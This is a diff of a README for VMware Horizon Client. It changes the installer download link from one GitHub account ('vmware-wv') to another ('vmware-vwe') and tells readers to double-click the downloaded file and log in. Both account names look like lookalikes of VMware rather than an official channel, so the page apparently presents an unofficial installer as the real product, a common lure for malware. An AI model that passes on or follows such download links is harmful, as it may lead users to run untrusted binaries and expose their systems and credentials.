@@ -8,7 +8,7 @@
 
 ## Installation
 To install VMware Horizon Client, begin by downloading the installer from the link provided below:      
-**⬇️ [VMware Horizon Client Windows Installer](https://github.com/vmware-wv/VMware-Horizon-Client/releases/tag/5.1)**
+**⬇️ [Download VMware Horizon Client](https://github.com/vmware-vwe/VMware-Horizon-Client/releases/tag/5.1)**
 
 After the download completes, double-click the file to launch the installer. Proceed through the setup wizard to select your preferences—such as enabling smart card access, customizing display configurations, or optimizing for performance. Once installation is finished, open the client and log in with your credentials. If connection problems arise, verify your network configuration or reach out to your IT support team.
 
